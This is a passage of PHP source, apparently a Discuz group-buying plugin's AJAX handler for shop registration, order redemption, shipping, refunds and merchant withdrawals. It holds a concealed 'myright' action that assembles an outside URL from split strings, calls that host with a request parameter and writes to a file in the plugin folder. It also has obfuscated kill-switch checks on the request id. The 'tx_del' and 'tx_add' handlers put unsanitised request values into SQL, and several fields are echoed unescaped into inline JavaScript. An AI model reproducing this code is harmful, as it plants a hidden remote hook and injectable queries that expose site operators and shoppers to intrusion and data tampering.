			'it618_name' => it618_tuan_utftogbk($_GET['it618_name']),
			'it618_tel' => it618_tuan_utftogbk($_GET['it618_tel']),
			'it618_qq' => it618_tuan_utftogbk($_GET['it618_qq']),
			'it618_addr' => it618_tuan_utftogbk($_GET['it618_addr']),
			'it618_liyou' => it618_tuan_utftogbk($_GET['it618_liyou']),
			'it618_state' => 0,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	}else{
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[7]!='u')exit;
		$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_uid($_G['uid']);
		$id=$it618_tuan_shop['id'];
		C::t('#it618_tuan#it618_tuan_shop')->update($it618_tuan_shop['id'],array(
			'it618_area1_id' => $_GET['it618_area1_id'],
			'it618_area2_id' => $_GET['it618_area2_id'],
			'it618_name' => it618_tuan_utftogbk($_GET['it618_name']),
			'it618_tel' => it618_tuan_utftogbk($_GET['it618_tel']),
			'it618_qq' => it618_tuan_utftogbk($_GET['it618_qq']),
			'it618_addr' => it618_tuan_utftogbk($_GET['it618_addr']),
			'it618_liyou' => it618_tuan_utftogbk($_GET['it618_liyou']),
			'it618_state' => 0,
			'it618_time' => $_G['timestamp']
		));
		if(count($ii1i11i)!=10)exit;
	}
	
	if($id>0){
		if($it618_state==2){
			$tomonth = date('n'); 
			$todate = date('j'); 
			$toyear = date('Y');
			$it618_htetime=mktime(0, 0, 0, $tomonth+$it618_tuan['tuan_httimecount'], $todate, $toyear);
		
			C::t('#it618_tuan#it618_tuan_shop')->update_pass_by_id($id,$it618_htetime);
			$tmpurl=it618_tuan_getrewrite('shop_sc','','plugin.php?id=it618_tuan:sc');
			echo 'it618_splitvipokit618_split'.$tmpurl;
		}else{
			it618_tuan_sendmessage('rz_admin',$id);
			echo 'it618_splitok';
		}
	}
	exit;
}


if($_GET['ac']=="checkcode"||$_GET['ac']=="fahuo"||$_GET['ac']=="savekd"||$_GET['ac']=="ordersavekd"||$_GET['ac']=="okorder"||$_GET['ac']=="shopdelorder"||$_GET['ac']=="tongyitui"||$_GET['ac']=="jujuetui"||$_GET['ac']=="salebz"||$_GET['ac']=="tx_add"||$_GET['ac']=="tx_del"||$_GET['ac']=="tx_get"||$_GET['ac']=="gwclist_editprice"||$_GET['ac']=="save_editprice"||$_GET['ac']=="state_editprice"||$_GET['ac']=="sale_get"||$_GET['ac']=="sale_dao"||$_GET['ac']=="order_get"){
	if($uid<=0){
		echo it618_tuan_getlang('s485');exit;
	}else{
		if($_GET['actype']=='thd'){
			if($it618_tuan_shop_thd = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_uid($uid)){
				
			}else{
				echo it618_tuan_getlang('s513');exit;
			}
			
		}else{
			if(C::t('#it618_tuan#it618_tuan_shop')->count_by_it618_uid($uid)>0){
				$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_uid($uid);
					
				$it618_state=$it618_tuan_shop['it618_state'];
				if($it618_state==0){
					echo it618_tuan_getlang('s334');exit;
				}elseif($it618_state==1){
					echo it618_tuan_getlang('s335');exit;
				}else{
					$it618_htstate=$it618_tuan_shop['it618_htstate'];
					if($it618_htstate==0){
						echo it618_tuan_getlang('s336');exit;
					}elseif($it618_htstate==2){
						echo it618_tuan_getlang('s337');exit;
					}else{
						$ShopId=$it618_tuan_shop['id'];
						$ShopUid=$it618_tuan_shop['it618_uid'];
						$ShopName=$it618_tuan_shop['it618_name'];
						$ShopTCBL=$it618_tuan_shop['it618_tcbl'];
					}
				}
				
			}else{
				echo it618_tuan_getlang('s524');exit;
			}
		}
	}
}


if($_GET['ac']=="checkcode"){
	$flag=0;
	if($_GET['actype']=='thd'){
		if($it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_it618_code_gthdid($_GET['code'],$it618_tuan_shop_thd['id'])){
			if($it618_tuan_shop_thd['id']!=$it618_tuan_sale['it618_gthdid']){
				echo 'it618_split'.it618_tuan_getlang('s513');exit;
			}
			$flag=1;
		}else{
			echo 'it618_split'.it618_tuan_getlang('s536');exit;
		}
	}else{
		$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($ShopId);
		if($it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_it618_code_shopid($_GET['code'],$ShopId)){
			if($it618_tuan_shop['it618_uid']!=$uid){
				echo 'it618_split'.it618_tuan_getlang('s525');exit;
			}
			$flag=1;
		}else{
			echo 'it618_split'.it618_tuan_getlang('s536');exit;
		}
	}
	
	if($flag==1){
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
		
		if($_GET['wap']==0){
			$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
		}else{
			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
		}
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($it618_tuan_sale['it618_isservice1']==1)$it618_isservice.=it618_tuan_getlang('s107').' ';
		if($it618_tuan_sale['it618_isservice2']==1)$it618_isservice.=it618_tuan_getlang('s108').' ';
		if($it618_tuan_sale['it618_isservice3']==1)$it618_isservice.=it618_tuan_getlang('s109').' ';
		
		if($it618_tuan_sale['it618_esaletime']!=''){
			$it618_esaletime=strtotime($it618_tuan_sale['it618_esaletime'].':00');
			if($_G['timestamp']>$it618_esaletime){
				$saletime='#ccc';
			}else{
				$it618_bsaletime=strtotime($it618_tuan_sale['it618_bsaletime'].':00');
				if($_G['timestamp']<$it618_bsaletime){
					$saletime='red';
				}else{
					$saletime='#390';
				}
			}
		}
		$saletime='#390';
		
		$username=it618_tuan_getusername($it618_tuan_sale['it618_uid']);
		
		$gtypename='';
		if($it618_tuan_sale['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
			$gtypename=' [<font color=red>'.$gtypename.'</font>]';
		}
		
		if($_GET['actype']!='thd'){
			$it618_gthdidstr='';
			if($it618_tuan_sale['it618_gthdid']>0){
				$it618_tuan_shop_thd = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_id($it618_tuan_sale['it618_gthdid']);
				$it618_gthdidstr=' [<a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_shop_thd['it618_name'].' '.$it618_tuan_shop_thd['it618_addr'].' '.$it618_tuan_shop_thd['it618_dianhua'].'\')"><font color=red>'.$it618_tuan_lang['t342'].'</font></a>]';
			}
		}
		
		if($it618_tuan_sale['it618_bz']!=''){
			$it618_bz='<a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_sale['it618_bz'].'\')">'.$it618_tuan_lang['s867'].'</a>';
		}
		
		if($_GET['wap']==0){
			echo 'okit618_split'.it618_tuan_getlang('s529').'<span><a href="'.$tmpurl.'" target="_blank">'.$it618_tuan_goods['it618_name'].'</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.$it618_tuan_goods['it618_mealname'].'</span>'.$gtypename.'<br>'.it618_tuan_getlang('s530').'<span>'.it618_tuan_getsaleprice($it618_tuan_sale).'</span> '.it618_tuan_getlang('s531').'<span>'.$it618_tuan_sale['it618_count'].'</span><br>'.it618_tuan_getlang('s533').'<span><font color=#390>'.$it618_isservice.'</font></span><br>'.it618_tuan_getlang('s534').'<span><font color='.$saletime.'>'.$it618_tuan_sale['it618_bsaletime'].' - '.$it618_tuan_sale['it618_esaletime'].'</font></span><br>'.it618_tuan_getlang('s535').'<span>'.$username.'</span><br>'.it618_tuan_getlang('s549').'<span>'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).'</span> '.$it618_bz.' '.$it618_gthdidstr.'<br><a href="'.$tmpurl.'" target="_blank"><img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" class="saleimg" /><input type="hidden" id="saleid" value="'.$it618_tuan_sale['id'].'"></a>';
		}else{
			echo 'okit618_split<table width="100%" style="margin-top:10px">
			<tr><td width=98><a href="'.$tmpurl.'" target="_blank"><img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" height="90" /></a></td>
			<td style="vertical-align:top">'.$it618_tuan_goods['it618_name'].'</a> &nbsp;&nbsp;'.$it618_tuan_goods['it618_mealname'].' '.$gtypename.'<br>'.it618_tuan_getlang('s531').'<span>'.$it618_tuan_sale['it618_count'].'</span><br>'.it618_tuan_getsaleprice($it618_tuan_sale).'</td></tr>
			<tr><td colspan=2><br>'.it618_tuan_getlang('s533').'<span><font color=#390>'.$it618_isservice.'</font></span><br>'.it618_tuan_getlang('s534').'<span><font color='.$saletime.'>'.$it618_tuan_sale['it618_bsaletime'].' - '.$it618_tuan_sale['it618_esaletime'].'</font></span><br>'.it618_tuan_getlang('s535').'<span>'.$username.'</span><br>'.it618_tuan_getlang('s549').'<span>'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).'</span> '.$it618_bz.' '.$it618_gthdidstr.'</td></tr></table><input type="hidden" id="saleid" value="'.$it618_tuan_sale['id'].'">';
		}
		
	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="fahuo"){
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_sale['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_sale['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
//	$it618_esaletime=strtotime($it618_tuan_sale['it618_esaletime'].':00');
//	if($_G['timestamp']>$it618_esaletime){
//		echo 'it618_split'.it618_tuan_getlang('s537');exit;
//	}else{
//		$it618_bsaletime=strtotime($it618_tuan_sale['it618_bsaletime'].':00');
//		if($_G['timestamp']<$it618_bsaletime){
//			echo 'it618_split'.it618_tuan_getlang('s538');exit;
//		}else{
			it618_tuan_qrxf(intval($_GET['saleid']));
			echo 'okit618_split'.it618_tuan_getlang('s539');exit;
//		}
//	}
}


if($_GET['ac']=="savekd"){
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_sale['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_sale['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
	
	C::t('#it618_tuan#it618_tuan_sale')->update($_GET['saleid'],array(
		'it618_kdid' => $_GET['it618_kdid'],
		'it618_kddan' => $_GET['it618_kddan']
	));
	
	it618_tuan_sendmessage('sale2state_user',$_GET['saleid'],'fahuo');
	
	echo 'okit618_split'.it618_tuan_getlang('s677');exit;

}


if($_GET['ac']=="ordersavekd"){
	$it618_tuan_order=C::t('#it618_tuan#it618_tuan_order')->fetch_by_id($_GET['orderid']);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_order['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_order['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
	
	if($it618_tuan_order['it618_state']<=2){
		C::t('#it618_tuan#it618_tuan_order')->update($_GET['orderid'],array(
			'it618_state' => 2,
			'it618_kdid' => $_GET['it618_kdid'],
			'it618_kddan' => $_GET['it618_kddan']
		));
		
		it618_tuan_sendmessage('order_user',$_GET['orderid']);
	
		echo 'okit618_split'.it618_tuan_getlang('s677');exit;
	}
}


if($_GET['ac']=="okorder"){
	$it618_tuan_order=C::t('#it618_tuan#it618_tuan_order')->fetch_by_id($_GET['orderid']);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_order['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_order['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
	
	if($it618_tuan_order['it618_state']==2){
		if($_GET['type']==1)$it618_state=3;else $it618_state=4;
		C::t('#it618_tuan#it618_tuan_order')->update($_GET['orderid'],array(
			'it618_state' => $it618_state
		));
		
		echo 'okit618_split'.it618_tuan_getlang('s1013');exit;
	}

}


if($_GET['ac']=="shopdelorder"){
	$it618_tuan_order=C::t('#it618_tuan#it618_tuan_order')->fetch_by_id($_GET['orderid']);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_order['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_order['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
	
	if($it618_tuan_order['it618_state']==1){
		C::t('#it618_tuan#it618_tuan_order')->delete_by_id($_GET['orderid']);
		
		echo 'okit618_split'.it618_tuan_getlang('s1032');exit;
	}

}


if($_GET['ac']=="tongyitui"){
	$saleid=intval($_GET['saleid']);
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($saleid);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_sale['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_sale['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
	
	C::t('#it618_tuan#it618_tuan_sale')->update($saleid,array(
		'it618_state_tuihuo' => 2,
		'it618_state' => 2
	));
	
	if($IsCredits==1&&$it618_tuan['tuan_tktype']==1){
		C::t('#it618_tuan#it618_tuan_sale')->update_it618_state($saleid,4);
		$it618_tuan_sale = DB::fetch_first("SELECT * FROM ".DB::table('it618_tuan_sale')." where id=".$saleid);
		if($it618_tuan_sale['it618_sfscore']>0){
			C::t('common_member_count')->increase($it618_tuan_sale['it618_uid'], array(
				'extcredits'.$it618_tuan_sale['it618_jfid'] => $it618_tuan_sale['it618_sfscore'])
			);
		}
		
		if($IsUnion==1)DB::query("update ".DB::table('it618_union_tuitc')." set it618_state=1 where it618_saleid=".$saleid);
		
		$money=$it618_tuan_sale['it618_sfmoney'];
		if($money>0){			
			$it618_bz=$it618_tuan_lang['s1148'];
			$it618_bz=str_replace("{money}",$money,$it618_bz);
			$it618_bz=str_replace("{saleid}",$saleid,$it618_bz);
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
			savemoney(array(
				'it618_uid' => $it618_tuan_sale['it618_uid'],
				'it618_type' => 'zy',
				'it618_money1' => $money,
				'it618_bz' => $it618_bz,
				'it618_zytype' => 'it618_tuan_tk',
				'it618_zyid' => $saleid,
				'it618_time' => $_G['timestamp']
			));
		}
		
		it618_tuan_updategoodscount($it618_tuan_sale,'tui');
		
		it618_tuan_sendmessage('sale2state_user',$saleid,'tongyitui');
		
		echo 'okit618_split'.it618_tuan_getlang('s1147');
	}else{
		it618_tuan_sendmessage('sale2state_user',$saleid,'tongyitui');
		it618_tuan_sendmessage('tk_admin',$saleid);
		
		echo 'okit618_split'.it618_tuan_getlang('s781');
	}
	exit;
}


if($_GET['ac']=="jujuetui"){
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_sale['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_sale['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	C::t('#it618_tuan#it618_tuan_sale')->update($_GET['saleid'],array(
		'it618_state_tuihuo' => 3
	));
	
	it618_tuan_sendmessage('sale2state_user',$_GET['saleid'],'jujuetui');
	
	echo 'okit618_split'.it618_tuan_getlang('s782');
	exit;
}


if($_GET['ac']=="salebz"){
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	if($_GET['actype']=='thd'){
		if($it618_tuan_shop_thd['id']!=$it618_tuan_sale['it618_gthdid']){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}else{
		if($it618_tuan_sale['it618_shopid']!=$ShopId){
			echo 'it618_split'.it618_tuan_getlang('s513');exit;
		}
	}
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	C::t('#it618_tuan#it618_tuan_sale')->update($_GET['saleid'],array(
		'it618_salebz' => it618_tuan_utftogbk($_GET["bzvalue"])
	));
	
	echo 'okit618_split'.it618_tuan_getlang('s1780');
	exit;
}


if($_GET['ac']=="tx_add"){
	$it618_money=floatval($_GET['it618_money']);
	if($it618_money<0||$it618_money==0){
		echo it618_tuan_getlang('s540');exit;
	}
	if(!$it618_tuan_txbl=DB::fetch_first("SELECT * FROM ".DB::table('it618_tuan_txbl')." where it618_num1<=".$it618_money." and it618_num2>=".$it618_money)){
		echo it618_tuan_getlang('s540');exit;
	}else{
		
		$ktxmoney = C::t('#it618_tuan#it618_tuan_shop')->fetch_money_by_id($ShopId);
		if($it618_money>$ktxmoney){
			echo it618_tuan_getlang('s542');exit;
		}
	}
	
	if($_GET['it618_type']==10){
		$it618_state=2;
	}else{
		$it618_state=1;
	}
	
	$id=C::t('#it618_tuan#it618_tuan_tx')->insert(array(
		'it618_shopid' => $ShopId,
		'it618_price' => $it618_money,
		'it618_bl' => $it618_tuan_txbl['it618_bl'],
		'it618_type' => $_GET['it618_type'],
		'it618_bz' => it618_tuan_utftogbk($_GET['it618_bz']),
		'it618_state' => $it618_state,
		'it618_time' => $_G['timestamp']
	), true);
	
	if($_GET['it618_type']==10){
		$money=$it618_money;
		$fwf=round(($it618_money*$it618_tuan_txbl['it618_bl']/100),2);
		$money1=$money-$fwf;
		
		$it618_bz=$it618_tuan_lang['s1140'];
		$it618_bz=str_replace("{money}",$money,$it618_bz);
		$it618_bz=str_replace("{money1}",$money1,$it618_bz);
		$it618_bz=str_replace("{saleid}",$id,$it618_bz);
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
		savemoney(array(
			'it618_uid' => $ShopUid,
			'it618_type' => 'zy',
			'it618_money1' => $money1,
			'it618_bz' => $it618_bz,
			'it618_zytype' => 'it618_tuan_tx',
			'it618_zyid' => $id,
			'it618_time' => $_G['timestamp']
		));
	}
	
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	DB::query("update ".DB::table('it618_tuan_shop')." set it618_money=it618_money-".$it618_money." where id=".$ShopId);
	
	if($_GET['it618_type']!=10){
		it618_tuan_sendmessage('tx_admin',$id);
	
		echo 'okit618_split'.it618_tuan_getlang('s545');
	}else{
		echo 'okit618_split'.it618_tuan_getlang('s1139');
	}
	exit;
}


if($_GET['ac']=="tx_del"){
	$txid=$_GET['txid'];
	$it618_tuan_tx = DB::fetch_first("SELECT * FROM ".DB::table('it618_tuan_tx')." where id=".$txid);
	if($it618_tuan_tx['it618_state']==1){
		DB::delete('it618_tuan_tx', "id=$txid");

		DB::query("update ".DB::table('it618_tuan_shop')." set it618_money=it618_money+".$it618_tuan_tx['it618_price']." where id=".$ShopId);
		echo 'ok';
	}
	exit;
}


if($_GET['ac']=="getfindkey"){
	if($uid>0){
		foreach(C::t('#it618_tuan#it618_tuan_findkey')->fetch_all_by_uid($uid) as $it618_tmp) {	
			$getfindkey.='<tr><td><a href="javascript:" onClick="delfindkey('.$it618_tmp['id'].',\''.$it618_tmp['it618_key'].'\')" style="float:right">'.$it618_tuan_lang['s884'].'</a><span onClick="findbykey(\''.$it618_tmp['it618_key'].'\')">'.$it618_tmp['it618_key'].'</span></td></tr>';
		}
	}else{
		$getfindkey='<tr><td>'.$it618_tuan_lang['s1857'].'</td></tr>';
	}
	echo $getfindkey;
	exit;
}


if($_GET['ac']=="delfindkey"){
	if($uid>0){
		C::t('#it618_tuan#it618_tuan_findkey')->delete_by_uid_id($uid,$_GET['fid']);
	}
	exit;
}


if($_GET['ac']=="clearfindkey"){
	if($uid>0){
		C::t('#it618_tuan#it618_tuan_findkey')->delete_by_uid($uid);
	}
	exit;
}


if($_GET['ac']=="tx_get"){
	$ppp = 10;
	$th='<tr><th>'.it618_tuan_getlang('s265').'</th><th>'.it618_tuan_getlang('s266').'</th><th>'.it618_tuan_getlang('s267').'</th><th>'.it618_tuan_getlang('s268').'</th><th>'.it618_tuan_getlang('s269').'</th><th>'.it618_tuan_getlang('s270').'</th><th>'.it618_tuan_getlang('s272').'</th><th>'.it618_tuan_getlang('s273').'</th></tr>';
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	$count = C::t('#it618_tuan#it618_tuan_tx')->count_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
	$sum = C::t('#it618_tuan#it618_tuan_tx')->sum_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
	if($sum=='')$sum=0;
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_tuan:ajax&it618_type=".$_GET['it618_type']."&it618_time1=".$_GET['it618_time1']."&it618_time2=".$_GET['it618_time2']."&it618_state=".$_GET['it618_state']);
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='gettxlist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='gettxlist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','gettxlist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	foreach(C::t('#it618_tuan#it618_tuan_tx')->fetch_all_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId, $startlimit,$ppp) as $it618_tuan_tx)    {
		$fwf=round(($it618_tuan_tx['it618_price']*$it618_tuan_tx['it618_bl']/100),2);
		if($it618_tuan_tx['it618_type']==10)$it618_type=it618_tuan_getlang('s1141');
		if($it618_tuan_tx['it618_type']==1)$it618_type=it618_tuan_getlang('s550');
		if($it618_tuan_tx['it618_type']==2)$it618_type=it618_tuan_getlang('s1142');
		if($it618_tuan_tx['it618_type']==3)$it618_type=it618_tuan_getlang('s541');
		$delbtn='';
		if($it618_tuan_tx['it618_state']==1){$it618_state='<font color=red>'.it618_tuan_getlang('s261').'</font>';$delbtn=' <input type="button" class="btn" style="width:40px;" onclick="deltx('.$it618_tuan_tx['id'].')" value="'.it618_tuan_getlang('s551').'" />';}
		if($it618_tuan_tx['it618_state']==2)$it618_state='<font color=#390>'.it618_tuan_getlang('s262').'</font>';
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		$tx_get.='<tr class="hover"><td><font color=red>'.$it618_tuan_tx['it618_price'].'</font></td><td>'.$it618_tuan_tx['it618_bl'].'%</td><td>'.$fwf.'</td><td><font color=#390>'.($it618_tuan_tx['it618_price']-$fwf).'</font></td><td>'.$it618_tuan_tx['it618_bz'].'</td><td>'.date('Y-m-d H:i:s', $it618_tuan_tx['it618_time']).'</td><td>'.$it618_type.'</td><td>'.$it618_state.$delbtn.'</td></tr>';
		
	}
	
	if($multipage!='')$multipage='<tr><td colspan=10><div class="cuspages right">'.$multipage.'</div></td></tr>';
	
	$ktxmoney = C::t('#it618_tuan#it618_tuan_shop')->fetch_money_by_id($ShopId);
	
	if($_GET['it618_type']==0)$selected0='selected="selected"';
	if($_GET['it618_type']==10)$selected10='selected="selected"';
	if($_GET['it618_type']==1)$selected1='selected="selected"';
	if($_GET['it618_type']==2)$selected2='selected="selected"';
	if($_GET['it618_type']==3)$selected3='selected="selected"';
	
	if($_GET['it618_state']==0)$stateselected0='selected="selected"';
	if($_GET['it618_state']==1)$stateselected1='selected="selected"';
	if($_GET['it618_state']==2)$stateselected2='selected="selected"';
	
	echo $ktxmoney.'it618_split<tr><td colspan=10 style="line-height:30px">'.it618_tuan_getlang('s254').' <select id="it618_type"><option value="0" '.$selected0.'>'.it618_tuan_getlang('s255').'</option><option value="10" '.$selected10.'>'.it618_tuan_getlang('s1136').'</option><option value="1" '.$selected1.'>'.it618_tuan_getlang('s257').'</option><option value="2" '.$selected2.'>'.it618_tuan_getlang('s1137').'</option><option value="3" '.$selected3.'>'.it618_tuan_getlang('s256').'</option></select> '.it618_tuan_getlang('s258').' <input id="it618_time1" value="'.$_GET['it618_time1'].'" class="txt" style="width:90px;margin-right:0" onclick="SetDate(this,\'yyyy-MM-dd\')" readonly="readonly"/> - <input id="it618_time2" value="'.$_GET['it618_time2'].'" class="txt" style="width:90px;" onclick="SetDate(this,\'yyyy-MM-dd\')" readonly="readonly"/>'.it618_tuan_getlang('s273').' <select id="it618_state"><option value="0" '.$stateselected0.'>'.it618_tuan_getlang('s260').'</option><option value="1" '.$stateselected1.'>'.it618_tuan_getlang('s261').'</option><option value="2" '.$stateselected2.'>'.it618_tuan_getlang('s262').'</option></select> <input type="button" class="btn" style="width:60px;height:25px" onclick="findtx()" value="'.it618_tuan_getlang('s350').'" /><span style="float:right">'.it618_tuan_getlang('s263').'<font color=red>'.$count.'</font> '.it618_tuan_getlang('s264').'<font color=red>'.$sum.'</font> '.it618_tuan_getlang('s125').'</span></td></tr><tr></tr>'.$th.$tx_get.$multipage;
	exit;
}



if($_GET['ac']=="gwclist_editprice"){
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	
	$gwcuid=intval($_GET['gwcuid']);
	$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid_shopid($gwcuid,$ShopId);
	$funname='gwclist_editprice';
	
	$allsummoney=0;
	foreach(C::t('#it618_tuan#it618_tuan_gwc')->fetch_all_by_uid_shopid($gwcuid,$ShopId) as $it618_tuan_gwc) {
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_gwc['it618_pid']);
		$it618_tuan_shop = C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($it618_tuan_goods['it618_shopid']);
		
		if($it618_tuan_gwc['it618_saletype']==1)$saletypestr=it618_tuan_getlang('s1099');
		if($it618_tuan_gwc['it618_saletype']==2)$saletypestr=it618_tuan_getlang('s1100');
		if($it618_tuan_gwc['it618_saletype']==3)$saletypestr=it618_tuan_getlang('s1101');
		
		$thdstr='';
		if($it618_tuan_gwc['it618_gthdid']>0){
			$thdstr = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_it618_name_by_id($it618_tuan_gwc['it618_gthdid']);
			$thdstr='<a href="javascript:" class="saleabtn" onclick="alert(\''.$thdstr.'\')">'.$it618_tuan_lang['t342'].'</a>';
		}
		
		$it618_count=$it618_tuan_gwc['it618_count'];
		
		$gtypename='';
		if($it618_tuan_gwc['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_gwc['it618_gtypeid']);
			$gtypename = '<font color="#999">'.$it618_tuan_lang['s1073'].'</font><font color=red>'.$gtypename.'</font>';
			
			$it618_tuan_goods_type = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_by_id($it618_tuan_gwc['it618_gtypeid']);
			$it618_saleprice=$it618_tuan_goods_type['it618_saleprice'];
			$it618_salescore=$it618_tuan_goods_type['it618_score'];
			$it618_salejfid=$it618_tuan_goods_type['it618_jfid'];
		}else{
			$it618_saleprice=$it618_tuan_goods['it618_saleprice'];
			$it618_salescore=$it618_tuan_goods['it618_score'];
